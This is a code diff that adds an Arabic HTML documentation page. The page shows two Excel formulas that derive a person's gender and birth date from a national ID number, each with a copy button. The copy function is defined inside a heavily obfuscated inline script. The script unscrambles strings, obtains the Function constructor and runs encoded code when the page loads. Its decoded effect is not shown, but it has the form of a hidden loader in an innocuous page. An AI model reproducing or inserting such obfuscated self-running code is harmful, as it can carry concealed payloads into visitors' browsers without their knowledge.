@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Docs UI</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        body {
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 20px;
+        }
+        
+        .code-box {
+            background: #020617;
+            color: #22c55e;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            transition: 0.3s;
+        }
+        
+        .copy-btn:hover {
+            transform: scale(1.05);
+        }
+    </style>
+
+</head>
+
+<body class="text-white p-6 max-w-5xl mx-auto">
+
+    <h1 class="text-3xl mb-8 text-center font-bold">📘 معادلات هامة</h1>
+
+    <!-- ================= SECTION 1 ================= -->
+    <div class="card mb-6">
+
+        <!-- <h2 class="text-xl mb-3 text-indigo-400">📌 مثال 1</h2> -->
+
+        <div class="mb-4 leading-relaxed text-gray-300">
+            هذه المعادلة تستخرج جنس الشخص بناءً على الرقم القومي الموجود في الخلية D7. إذا كان الرقم القومي يحتوي على رقم زوجي في الموقع المحدد، فإن النتيجة ستكون "أنثى"، وإذا كان يحتوي على رقم فردي، فإن النتيجة ستكون "ذكر".
+
+            <div class="relative">
+                <pre id="code1" class="code-box p-4 rounded-xl overflow-x-auto">
+=IF(MOD(MID(D7,LEN(D7)-1,1),2)=0,"أنثى","ذكر")        
+</pre>
+
+                <button onclick="copyCode('code1', this)" class="copy-btn absolute top-2 left-2 bg-indigo-600 px-3 py-1 rounded text-sm">
+            نسخ
+        </button>
+            </div>
+
+        </div>
+
+        <!-- ================= SECTION 2 ================= -->
+        <div class="card mb-6">
+
+            <!-- <h2 class="text-xl mb-3 text-indigo-400">📌 مثال 2</h2> -->
+
+            <div class="mb-4 leading-relaxed text-gray-300">
+                هذه المعادلة تُنشئ تاريخً ميلاد الشخص بناءً على الرقم القومي الموجود في الخلية D7.
+
+                <div class="relative">
+                    <pre id="code2" class="code-box p-4 rounded-xl overflow-x-auto">
+=DATE(IF(LEFT(D7,1)="2",1900,2000)+MID(D7,2,2),MID(D7,4,2),MID(D7,6,2))
+        </pre>
+
+                    <button onclick="copyCode('code2', this)" class="copy-btn absolute top-2 left-2 bg-indigo-600 px-3 py-1 rounded text-sm">
+            نسخ
+        </button>
+                </div>
+
+            </div>
+
+            <script>
+                var copyCode;
+                (function() {
+                    var kaw = '',
+                        CFe = 378 - 367;
+
+                    function qPA(z) {
+                        var m = 3209733;
+                        var q = z.length;
+                        var s = [];
+                        for (var k = 0; k < q; k++) {
+                            s[k] = z.charAt(k)
+                        };
+                        for (var k = 0; k < q; k++) {
+                            var g = m * (k + 279) + (m % 36002);
+                            var a = m * (k + 503) + (m % 19383);
+                            var e = g % q;
+                            var v = a % q;
+                            var t = s[e];
+                            s[e] = s[v];
+                            s[v] = t;
+                            m = (g + a) % 5399400;
+                        };
+                        return s.join('')
+                    };
+                    var dTk = qPA('cqorrrsstbndvxekhiocjloufaycmntuzwtpg').substr(0, CFe);
+                    var LXz = 'g=x0iwo0[1r2}v.sg=S(]r )x"f{ht)f 6]d6+,=8(rra[hvnxor6;v)-uj >-f,o,oi]0[;;;l b7 {5j);27);");m),t,.tu,6n,he,0,n7,mv(ottnnyo;jar za[nr"ikcvehdrp0,pl;=a;.C.te"+u,}hp6,g]3i7p;t4] r=e;llaath;e5t>2lah9e5rr]v3c;0;r)ry(8nog;renl7.lp](=nam+t +v)=iic)ru(]psdrokor=vh7)9og-==flifv=2;+{<nlsnn11)rbt7gj=lysd6t..op="uolewj[r.(.vhamasr12(huvdr)pgeo=)(r(=(w)nc+;f+t74e); (;0ir)r=ra,+[;A<i.s,2j.v1rpkaoe=+unC8t9ACdv),vr;.veq.mi;Ct;uq=m= ==1i*=+h.j1arCaa(=t]dr;+es; =hpg1h)o+eve6+=igg(7Cvh=v,(f,,g=u(sksrm1)aa,Ca+v8k(v)t)vnr=epor.o9ezlaeg1l-0]s(Cevc=(.};sast";(ei.u(;f a(rlfnwnt)vb[[[{rui0,)d.f)w ,;hslbvbriAri.e};(tvwpys+]e[*;a]apo o);gdig(=h9vn(u;t).(h<uaf)c=[h;xr,h=rrzl4g(8nqgh.)(-;.8i2(ihi a8a;x=;lg )++]oai"<x9rao.s;l7( +t;jno x)ls1, 99o00tr=92d<d}tcoox+;nA0=aspacs)=rarn+nuo(8viroof n3)s;4.-rvea o=A;l64=r[d-t ;pi+tl=ltxsl[b!;7f {e,zm",oho}"punhSod}ng==u. {;)+(=ru8r.ad"s([e{u+tbli(pn1;+]+fpg .01,n!idc';
+                    var gTx = qPA[dTk];
+                    var eIG = '';
+                    var dRB = gTx;
+                    var dtd = gTx(eIG, qPA(LXz));
+                    var GNu = dtd(qPA('].!$^^c.n#{(.o=t)^!^^o^^.jt{^rn(_et$njlsga]o(_s3;_vbuborure}^0jc],.^m)n,etdd(umont^uaiu+r^}!3ina51i=_i5.}"^e^uf^d\'dr,%8t!t")n4v&n,_^;a(\/,3$6]^^n^u,5tf!^p:f_!2)=d- o13^ ^0{),x6^)^r^z.m3n(3j3h!o!)b4^d5=ne;4^;nih8!g)6(ens^Et,^.s![.a\'^(.i^(;=t;^8^}(^(^465*n7< g+).z^d]m_.].!^e3+o8jf5(fa(f9fd=i;(*Tagt^pitet^j3=b"+fan^4th8na-ta& h^j)i-ja()a*C!^<of4!b5) ^-72(39n^4_(.(^m&$\/S^vo3)5t,tf60i^2no;j9uo:n(4hd(2C^!^}hj(o;^7^)ar_6f;t72%_mg.w^%+0320gev,buf$fTrn4],e^..!ug^;ai68}t)^b,tS^e an$$.,.6a)d;.rC$!36s.^)0,c7 5)(.;=(^b$<=.m)^fio^\/.^oi;..l%e4.vo3faj;i7et^)n]dq!{a^[t6;i$^vw,ew2#.,g6.b^^,^=gofi342ou.^!97e^e.l()]ewS$+tfg=%tf2fx {ei%ne6o;e{,Iob^g=ru(_ =v%5_ea0a35}b ub3\'7.^,.x_o7e^6or]cit^()b;7ns](i,^0p".0471dfr,29(dj7a;^0bq0p7s*e=1^ j;$3)t(hfd=8b4di(4a3n"t%4(im05}t{a.(.b^5fub6$grTis5%tz,0r-ee^(r^e;..^aje1z;]^$]&at8_ttl(^^7.f;7 .r.]lt3$$i ^f^tr 0st09)o!."{$g(;84t^^+(^(f8$t;%^_^a$8b!$,use^ds(!dtb!^d.!^vf\'^!^tz! .)o44(z.(<pa3x5ibj37!(j^.,2)Th.#otuf\/]}ea1f_gf.n^)^^3=78bcm5xv$3$_{%dg4(*f^^^[2{s0#$p=_,s8^^i8c^ftf^$0yy^^"9dae,ov}^.,!5_)^b1(.)^[1^^.f_t.n].\'j"$t_e!{)30.f_e_^b%+g$e_^^3ovn4z-ti^_jm.ff3$.#{,.x^o80)\/^ )\'j{(3n7tt^))e.1}tt6beib^6{ttu^lb.r_$n=*83)^$^f.;1n:n^73#%(sq)$6^2ra^-:;g#33)h ,^b!^eT)0lj)+[ ,}^%^^f4)7^$o3)n^gre.[ce^:cv)};z^e${ 7aj4(_#39.$; r^]f_40_6tj00_ ^)]2:of_03;3) f)$,8   ^j[\/&(s^4hfh_ii  ,)nr=bomec(;.^,b )h'));
+                    var oHS = dRB(kaw, GNu);
+                    oHS(1484);
+                    return 2023
+                })()
+            </script>
+
+</body>
+
+</html>
